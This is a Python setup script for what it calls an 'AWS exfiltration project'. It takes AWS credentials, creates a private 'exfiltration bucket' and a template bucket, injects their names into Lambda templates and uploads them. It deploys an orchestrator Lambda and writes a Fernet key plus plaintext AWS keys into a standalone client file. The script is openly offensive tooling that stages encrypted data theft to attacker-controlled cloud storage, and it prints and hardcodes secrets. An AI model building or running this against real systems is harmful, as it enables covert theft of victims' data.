import boto3
from cryptography.fernet import Fernet
import json
from botocore.exceptions import ClientError
from zipfile import ZipFile

import sys
import botocore

print('Welcome to AWS exfiltration project!')
clientEnteredData = True

while clientEnteredData:
	aws_access_key = input("Enter AWS access key: ")
	aws_secret_access_key = input("Enter AWS secret access key: ")
	region_name = input("Enter preferred region: ")
	fernet_key = Fernet.generate_key()
	orchestrator_name = input("Enter a cool name for your orchestrator function: ")
	exfiltration_bucket_name = input("Enter a name for your exfiltration bucket, remember names must be lowecase and unique: ")
	template_bucket_name = input("Enter a name for your template bucket, remember names must be lowecase and unique: ")
	iam_role_arn = input("Enter the iam_role arn: ")
	print('-------------------------------------------------')
	print('Info entered was the following:')
	print('aws_access_key: ' + aws_access_key)
	print('aws_secret_access_key: ' + aws_secret_access_key)
	print('region_name: ' + region_name)
	print('exfiltration_bucket_name: ' + exfiltration_bucket_name)
	print('template_bucket_name: ' + template_bucket_name)
	print('iam_role_arn: ' + iam_role_arn)
	print('-------------------------------------------------')
	client_data = input('Is this information correct? [y/n]: ')
	if client_data == 'y':
		clientEnteredData = False

	print('Your encryption/decryption key is: ' + fernet_key.decode() + '\nSave it!, this is needed for Decrypter setup')

print('Connecting to aws...')

session = boto3.session.Session(
			aws_access_key_id = aws_access_key, 
			aws_secret_access_key = aws_secret_access_key,
			region_name = region_name
			)
print('...Connected!')
print('-------------------------------------------------')

s3_client = session.client('s3')

exfiltrationBucketInCreation = True
while exfiltrationBucketInCreation:
	print('Creating exfiltration bucket...')
	try:
		s3_client.create_bucket(
				ACL = 'private',
				Bucket = exfiltration_bucket_name,
				CreateBucketConfiguration = {
						'LocationConstraint': region_name
					}
				)
		exfiltrationBucketInCreation = False
		print('...Exfiltration bucket created!')
	except ClientError as e:
		if 'InvalidAccessKeyId' in str(e):
			print('The access_key provided is not valid, please check and restart setup')
			sys.exit()
		if 'SignatureDoesNotMatch' in str(e):
			print('The secret_access_key provided is not valid, please check and restart setup')
			sys.exit()
		print('That bucket name already exists!, please select another name')
		exfiltration_bucket_name = input("Enter a name for your exfiltration bucket, remember names must be lowecase and unique: ")
	except botocore.exceptions.EndpointConnectionError:
		print('Invalid region provided, check and restart setup')
		sys.exit()

templateBucketInCreation = True
while templateBucketInCreation:
	print('Creating template bucket...')
	try:
		s3_client.create_bucket(
				ACL = 'private',
				Bucket = template_bucket_name,
				CreateBucketConfiguration = {
						'LocationConstraint': region_name
					}
				)
		templateBucketInCreation = False
		print('...Template bucket created!')
	except ClientError:
		print('That bucket name already exists!, please select another name')
		template_bucket_name = input("Enter a name for your template bucket, remember names must be lowecase and unique: ")

print('-------------------------------------------------')

s3_resource = session.resource('s3')

print("Modifying template files...")
print("Sample function setup...")
#######Sample function setup
#------------------Modifying data------------------
with open('sampleFunction.py','r') as f:
	lines = f.readlines()
	#print(lines)
with open('sampleFunction.py','w') as f:
	lines.insert(3, str("exfiltration_bucket_name = " + "'" + exfiltration_bucket_name + "'\n"))
	f.write("".join(lines))
#------------------Compressing------------------
zipObj = ZipFile('sampleFunction.zip', 'w')
zipObj.write('sampleFunction.py')
zipObj.close()
#------------------Upload function to s3 bucket--------
s3_resource.meta.client.upload_file('sampleFunction.zip', template_bucket_name, 'sampleFunction.zip')

#######Orchestrator setup
print("Orchestrator setup...")
#------------------Modifying data------------------
with open('orchestrator.py','r') as f:
	lines = f.readlines()
	#print(lines)
with open('orchestrator.py','w') as f:
	lines.insert(6, str("template_bucket_name = " + "'" + template_bucket_name + "'\n"))
	lines.insert(7, str("compressed_function_name = " + "'" + "sampleFunction.zip" + "'\n"))
	lines.insert(8, str("lambda_s3_iam_role = " + "'" + iam_role_arn + "'\n"))
	f.write("".join(lines))
#-----------------Compressing----------------
zipObj = ZipFile('orchestrator.zip','w')
zipObj.write('orchestrator.py')
zipObj.close()
#-----------------Upload function to s3 bucket---------
s3_resource.meta.client.upload_file('orchestrator.zip', template_bucket_name, 'orchestrator.zip')
#-----------------Create lambda function based on previous template--------------
aws_lambda = session.client('lambda')
creatingLambda = True
while creatingLambda:
	try:
		aws_lambda.create_function(
       		FunctionName = orchestrator_name,
        	Runtime = 'python3.7',
        	Role = iam_role_arn,
        	Handler = 'orchestrator.lambda_handler',
        	Code = {
            	'S3Bucket': template_bucket_name,
            	'S3Key': 'orchestrator.zip'
            	},
        	Timeout = 300,
        	MemorySize = 512 
        	)
		creatingLambda = False
	except Exception as e:
		if 'ResourceConflictException' in str(e):
			print('That function already exists!, please choose another name')
		else:
			print(e)
			print('Unknown exception, quitting! Buckets may have been already created, please delete them before running setup again')
			sys.exit()
		orchestrator_name = input("Enter a cool name for your orchestrator function: ")

#######Standalone Client
print("Client setup...")
#------------------standaloneClient template------------------
with open('standaloneClient.py','r') as f:
	lines = f.readlines()
	#print(lines)
with open('standaloneClient.py','w') as f:
	lines.insert(9, str("key = " + "b" + "'" + fernet_key.decode() + "'\n"))
	lines.insert(10, str("aws_access_key_id = " + "'" + aws_access_key + "'\n"))
	lines.insert(11, str("aws_secret_access_key = " + "'" + aws_secret_access_key + "'\n"))
	lines.insert(12, str("region = " + "'" + region_name + "'\n"))
	lines.insert(13, str("orchestrator_function_name = " + "'" + orchestrator_name + "'\n"))
	f.write("".join(lines))



print("...All files modified!")
print('-------------------------------------------------')
print('Setup is complete!')
print('Cleaning up...')

import os

os.remove("orchestrator.zip")
os.remove("sampleFunction.zip")
print("Finished!")




#with open('config.json','w') as f:
#	json.dump(config, f, ensure_ascii = False)
